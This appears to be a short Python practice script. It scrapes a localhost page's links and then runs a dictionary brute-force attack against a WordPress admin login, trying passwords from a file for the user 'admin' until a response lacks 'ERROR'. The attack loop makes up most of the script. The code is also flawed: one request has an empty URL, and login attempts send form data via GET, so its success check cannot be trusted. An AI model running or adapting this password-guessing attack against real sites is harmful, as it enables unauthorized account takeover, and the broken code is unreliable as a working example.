import requests
from bs4 import BeautifulSoup

req = requests.get("https://")
print(req.headers)

print(req.content)

print(req.text)

soup = BeautifulSoup(req.text, 'html.parser')

print(soup.prettify())

print(soup.title)

home = requests.get("https://localhost")
soup = BeautifulSoup(home.content, "html.parser")
img = soup.find_all("a", href=True)
img_href = []
for im in img:
    img_href.append(im['href'])

img_set = set(img_href)

for im in img_set:
    print(im)

word_p = requests.get("https://localhost/wp-admin/")
soup_word = BeautifulSoup(word_p.text, 'html.parser')
print(soup_word.prettify())

passFile = "password_dictionary.txt"
with open(passFile, "r") as f:
    for w in f:
        word = w.strip("\n")
        trying = requests.get("https://localhost/wp-login.php", data={"log": "admin", "pwd": word})
        if "ERROR" not in trying.text:
            print("Success, the password is:" + word)
            break
        else:
            print("Incorrect password: " + word)
